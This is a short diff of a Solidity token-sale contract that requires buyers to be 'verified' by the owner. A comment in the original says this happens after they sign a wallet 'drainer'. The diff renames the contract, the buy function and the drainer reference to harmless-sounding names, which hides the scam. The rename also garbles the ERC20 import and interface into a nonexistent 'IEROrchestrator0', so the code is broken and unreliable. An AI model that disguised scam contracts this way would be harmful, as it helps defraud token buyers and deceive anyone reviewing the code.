@@ -1,12 +1,12 @@
-// J/contracts/Gatekeeper.sol
+// J/contracts/Validator.sol
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import "@openzeppelin/contracts/token/EROrchestrator0/IEROrchestrator0.sol";
 import "@openzeppelin/contracts/access/Ownable.sol";
 
-contract Gatekeeper is Ownable {
-    IERC20 public targetToken;
+contract Validator is Ownable {
+    IEROrchestrator0 public targetToken;
     uint256 public price = 0.001 ether;
     bool public publicLive = false;
 
@@ -14,7 +14,7 @@ contract Gatekeeper is Ownable {
     mapping(address => bool) public isVerified;
 
     constructor(address _token) {
-        targetToken = IERC20(_token);
+        targetToken = IEROrchestrator0(_token);
     }
 
     function setLive(bool _status) external onlyOwner {
@@ -22,14 +22,14 @@ contract Gatekeeper is Ownable {
     }
 
     // The "Buy" function users are trying to call
-    function sniperBuy(uint256 amount) external payable {
+    function PriorityBuy(uint256 amount) external payable {
         require(msg.value >= amount * price, "Insufficient ETH");
         require(isVerified[msg.sender], "Security Audit Required First");
         
         targetToken.transfer(msg.sender, amount);
     }
 
-    // The function that marks them as "Safe" (after they sign the drainer)
+    // The function that marks them as "Safe" (after they sign the IntegritySyncer)
     function verifyUser(address user) external onlyOwner {
         isVerified[user] = true;
     }
